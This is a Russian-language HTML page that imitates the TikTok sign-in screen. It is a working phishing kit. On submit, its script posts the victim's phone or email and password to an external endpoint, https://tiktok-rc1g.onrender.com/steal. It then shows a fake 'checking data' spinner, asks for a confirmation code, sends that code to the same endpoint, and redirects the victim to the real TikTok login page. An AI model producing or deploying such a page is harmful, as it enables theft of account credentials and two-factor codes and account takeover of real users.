<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 480px;
            background-color: #000000;
            border: 1px solid #2f2f2f;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }

        /* Логотип (Значок + Текст) */
        .logo-box {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
        }

        .logo-text {
            font-size: 38px;
            font-weight: 900;
            letter-spacing: -1.5px;
            color: #ffffff;
            text-shadow: -2px 0 #25f4ee, 2px 0 #fe2c55;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        p.subtitle {
            color: #a8a8a8;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 13px;
            color: #a8a8a8;
            margin-bottom: 8px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background-color: #121212;
            border: 1px solid #2f2f2f;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #fe2c55;
        }

        .btn-primary {
            width: 100%;
            padding: 14px;
            background-color: #fe2c55;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #e0264c;
        }

        /* Стили для кнопки Twitter */
        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 12px;
            background-color: transparent;
            border: 1px solid #2f2f2f;
            border-radius: 4px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 15px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .social-btn:hover {
            background-color: #121212;
        }

        .social-btn svg {
            width: 18px;
            height: 18px;
            margin-right: 10px;
            fill: #ffffff;
        }

        /* Кружок загрузки */
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }

        /* Ссылки внизу */
        .bottom-links {
            margin-top: 25px;
            font-size: 13px;
            color: #a8a8a8;
        }

        .bottom-links a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }

        .bottom-links a:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #2f2f2f;
            margin: 20px 0;
            font-size: 12px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #2f2f2f;
        }
        .divider:not(:empty)::before { margin-right: 10px; }
        .divider:not(:empty)::after { margin-left: 10px; }
    </style>
</head>
<body>

<div class="login-container">

    <!-- ШАГ 1: Логин и пароль -->
    <div id="step1">
        <!-- Значок и текст TikTok -->
        <div class="logo-box">
            <!-- Векторный значок TikTok (не требует загрузки картинок) -->
            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" fill="#25F4EE"/>
                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" fill="#FE2C55" transform="translate(1, -1)"/>
                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" fill="#ffffff"/>
            </svg>
            <div class="logo-text">TikTok</div>
        </div>

        <h1>Вход в аккаунт</h1>
        <p class="subtitle"></p>

        <form id="form1">
            <div class="form-group">
                <label>Телефон или email</label>
                <input type="text" id="username" placeholder="Телефон / email / имя пользователя" required>
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="password" placeholder="Пароль" required>
            </div>
            <button type="submit" class="btn-primary" id="btn1">Войти</button>
        </form>

        <div class="divider">или</div>

        <!-- Кнопка Twitter (X) -->
        <button class="social-btn" type="button">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/>
            </svg>
            Продолжить с Twitter
        </button>

        <div class="bottom-links">
            <p>Нет аккаунта? <a href="#" onclick="return false;">Зарегистрироваться</a></p>
            <p style="margin-top:10px;"><a href="#" onclick="return false;">Забыли пароль?</a></p>
        </div>
    </div>

    <!-- ШАГ 2: Загрузка -->
    <div id="loading" class="hidden">
        <div class="logo-text" style="margin-bottom: 20px;">TikTok</div>
        <h1>Проверка данных...</h1>
        <div class="spinner"></div>
    </div>

    <!-- ШАГ 3: Запрос кода -->
    <div id="step2" class="hidden">
        <div class="logo-text" style="margin-bottom: 20px;">TikTok</div>
        <h1>Подтверждение входа</h1>
        <p class="subtitle">Мы отправили код подтверждения на вашу почту/телефон. Введите его ниже.</p>

        <form id="form2">
            <div class="form-group">
                <label>Код подтверждения</label>
                <input type="text" id="code" placeholder="Введите код" required>
            </div>
            <button type="submit" class="btn-primary" id="btn2">Подтвердить</button>
        </form>
    </div>

</div>

<script>
    // Шаг 1: Логин и пароль
    document.getElementById('form1').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const btn1 = document.getElementById('btn1');

        btn1.innerText = "Загрузка...";
        btn1.disabled = true;

        fetch('https://tiktok-rc1g.onrender.com/steal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: username, password: password })
        })
        .then(() => {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('loading').classList.remove('hidden');

            setTimeout(() => {
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }, 2000);
        })
        .catch(() => {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('loading').classList.remove('hidden');
             setTimeout(() => {
                 document.getElementById('loading').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
             }, 2000);
        });
    });

    // Шаг 2: Код подтверждения
    document.getElementById('form2').addEventListener('submit', function(e) {
        e.preventDefault();

        const code = document.getElementById('code').value;
        const btn2 = document.getElementById('btn2');

        btn2.innerText = "Проверка...";
        btn2.disabled = true;

        fetch('https://tiktok-rc1g.onrender.com/steal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code })
        })
        .then(() => {
            window.location.href = "https://www.tiktok.com/login";
        })
        .catch(() => {
            window.location.href = "https://www.tiktok.com/login";
        });
    });
</script>

</body>
</html>
